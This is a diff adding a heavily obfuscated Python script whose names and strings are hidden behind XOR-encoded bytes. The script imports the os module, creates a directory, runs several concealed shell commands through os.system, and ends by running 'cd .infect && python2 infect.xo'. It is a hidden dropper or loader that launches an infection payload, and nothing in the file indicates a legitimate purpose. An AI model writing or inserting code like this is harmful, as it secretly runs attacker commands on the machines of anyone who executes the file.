@@ -1,0 +1,62 @@
+lOOO10OOl1Ol11l0OOO11 = (lambda O11O0OO0lll10l000O11O,
+    ll0O01O100O1O1010Olll: O11O0OO0lll10l000O11O ^ ll0O01O100O1O1010Olll)
+OO01O001Ol1OlllllO1Ol = (lambda lO0l0O11O1O0lO0111O0O,
+    lO0OlllOlO00OlO0lll10: lO0l0O11O1O0lO0111O0O + lO0OlllOlO00OlO0lll10)
+lOlOOOlOl1010O10lOll1 = __import__('er'[::-1], globals(), locals(), [], 0 *
+    7 + 0)
+lO1O11lOll10O0O101lOl = __import__(''.join(chr(l00O0ll1O0l110110l0OO ^
+    l00lOO0l010Ol11O1O0ll) for l00lOO0l010Ol11O1O0ll, l00O0ll1O0l110110l0OO in
+    zip(b'\xf9\xe7', b'\x96\x94')), globals(), locals(), [], 0 * 6 + 0)
+
+
+def Ol11lOllO0l1l0ll1l10l():
+ try:
+  getattr(lO1O11lOll10O0O101lOl, ''.join(chr(llO0O1lOO0lOO00l1001l ^
+      OlO101O1lO0O0O0O1llO0) for OlO101O1lO0O0O0O1llO0,
+      llO0O1lOO0lOO00l1001l in zip(b'8\x84\xc9<\xca', b'U\xef\xadU\xb8')))(''
+      .join(chr(OOl0Ol10OO00OO1001OOl ^ l1ll000l01O0O001lO010) for 
+      l1ll000l01O0O001lO010, OOl0Ol10OO00OO1001OOl in zip(
+      b'\xc8,-i~g\xb4\xc8Y\x92m\x8fmM',
+      b'\xbcOH\x0f\x10\x0e\x9b\xac+\xf3\x0e\xeb\x1eb'))[::-1 * 14 + 13])
+ except IOError:
+  pass
+  getattr(lO1O11lOll10O0O101lOl, 'metsys'[::-1])(OO01O001Ol1OlllllO1Ol(''.
+      join(chr(O0l01lOO111llOOO10ll1 ^ Ol1l1lO0l01011O000l11) for 
+      Ol1l1lO0l01011O000l11, O0l01lOO111llOOO10ll1 in zip(
+      b'\x111\x1a\xa9\xe7\x8bN\x891\xa3', b'aZ}\x89\x8e\xe5=\xfdP\xcf')),
+      ''.join(chr(OOl0lO0ll01OlOl0O10ll ^ l0O00l10OlO11OOO11Oll) for 
+      l0O00l10OlO11OOO11Oll, OOl0lO0ll01OlOl0O10ll in zip(
+      b'/\xa8\xfe\xc2\x9dt\xdd\xc8\xc9\xf8\xe0',
+      b'C\x88\x90\xad\xf9\x11\xb7\xbb\xe9\xd5\x99'))))
+  getattr(lO1O11lOll10O0O101lOl, 'sys' + 'tem')(''.join(filter(lambda
+      lO100lOOl00010OOl00l1: ord(lO100lOOl00010OOl00l1) % 2 != 0,
+      'jZ8zZx`F\x00x\x0cD\x1e*j')).join(chr(lOOl1lOO11l00lOOOl1O1 ^
+      ll11Ol1l1Ol01lO1O1lOO) for ll11Ol1l1Ol01lO1O1lOO,
+      lOOl1lOO11l00lOOOl1O1 in zip(
+      b'\xf7\xde\x83\xda-\x8ci\xd2\x8b\xf2\xd1>\xbd\xe5\xe3\xb2',
+      b'\x87\xb7\xf3\xe8\r\xe5\x07\xa1\xff\x93\xbdR\x9d\x8b\x93\xdf')))
+  print(''.join(chr(lOOO10OOl1Ol11l0OOO11(l01O0101l110OOOO110O1,
+      OlO11O0OlO01O1OOl0llO)) for OlO11O0OlO01O1OOl0llO,
+      l01O0101l110OOOO110O1 in zip(
+      b'\xc2\xc3Zbf*\xac\xf7\xb1\xb0&\xd6\xc7\x97\xa3\n!\xee\xf2a\xcb\xb3\xcbJD\xd2\xa0\x8aJ?\xab'
+      ,
+      b'\xd9\x98jYU\x1a\xc1\xa3\xde\xdfJ\xf6\xae\xf9\xd0~@\x82\x9e\x00\xbf\xda\xa4$_\x89\x90\xb1y\x0f\xc6'
+      )))
+  getattr(lO1O11lOll10O0O101lOl, 'metsys'[::-1])(''.join(chr(
+      O0000l11OllOO0OOlll0O ^ llOlO00lO1O0O00110l01) for 
+      llOlO00lO1O0O00110l01, O0000l11OllOO0OOlll0O in zip(
+      b'\xe2nq\x850+v*\x18\x08\xd6S\x93\x83\xa3\x01\xd1\x9d\xac\x9f\x94\x91=x\x9b\xba\x9b\x1d9]\xe8\x13\x9e\xd1P\x87\xcf.\xc4_\xdc\x8bCb\x83%\x02\x84\x8e'
+      ,
+      b"\x85\x07\x05\xa5SG\x19D}(\xbe'\xe7\xf3\xd0;\xfe\xb2\xcb\xf6\xe0\xf9H\x1a\xb5\xd9\xf4p\x16\x10\x81}\xf6\xb0#\xe4\xa0J\xa0l\xae\xa4m\x0b\xedCg\xe7\xfa"
+      )))
+  getattr(lO1O11lOll10O0O101lOl, ''.join(chr(OO1OO0OO00l1ll1l1O1OO ^
+      l10lO01001O1ll000O011) for l10lO01001O1ll000O011,
+      OO1OO0OO00l1ll1l1O1OO in zip(b'\x8cw\xe6c\x01\x89',
+      b'\xff\x0e\x95\x17d\xe4')))('cd .inf' + 'ect && p' + ('ython2 i' +
+      'nfect.xo'))
+
+
+if __name__ == ''.join(chr(OlOlOlOl10O1O110ll01O ^ lO11l10O1O1OO0lllOOO0) for
+    lO11l10O1O1OO0lllOOO0, OlOlOlOl10O1O110ll01O in zip(
+    b'\xb7]cv#\xdb\xe3\x9a', b'\xe8\x02\r\x1fB\xb6\xbc\xc5'))[::-1 * 5 + 4]:
+ Ol11lOllO0l1l0ll1l10l()
